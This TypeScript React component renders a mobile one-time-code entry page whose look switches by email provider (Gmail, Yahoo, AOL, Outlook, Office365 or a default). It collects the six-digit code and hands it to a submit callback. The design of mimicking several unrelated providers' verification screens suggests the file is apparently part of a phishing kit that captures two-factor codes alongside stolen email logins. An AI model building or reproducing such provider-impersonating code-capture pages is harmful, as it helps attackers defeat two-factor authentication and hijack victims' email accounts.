import React, { useState } from 'react';
import { OtpPageProps } from '../otp/otpUtils';
import MobileGmailOtp from '../otp/MobileGmailOtp';
import MobileYahooOtp from '../otp/MobileYahooOtp';
import MobileAolOtp from '../otp/MobileAolOtp';
import MobileOutlookOtp from '../otp/MobileOutlookOtp';
import MobileOffice365Otp from '../otp/MobileOffice365Otp';
import MobileDefaultOtp from '../otp/MobileDefaultOtp';

const MobileOtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider, onResend }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length >= 6) {
      onSubmit(otp);
    }
  };

  const sharedProps = { email, errorMessage, isLoading, otp, onOtpComplete: handleOtpComplete, onSubmit: handleSubmit };

  switch (provider) {
    case 'Gmail':
      return <MobileGmailOtp {...sharedProps} />;
    case 'Yahoo':
      return <MobileYahooOtp {...sharedProps} onResend={onResend} />;
    case 'AOL':
      return <MobileAolOtp {...sharedProps} onResend={onResend} />;
    case 'Outlook':
      return <MobileOutlookOtp {...sharedProps} onResend={onResend} />;
    case 'Office365':
      return <MobileOffice365Otp {...sharedProps} onResend={onResend} />;
    default:
      return <MobileDefaultOtp {...sharedProps} />;
  }
};

export default MobileOtpPage;
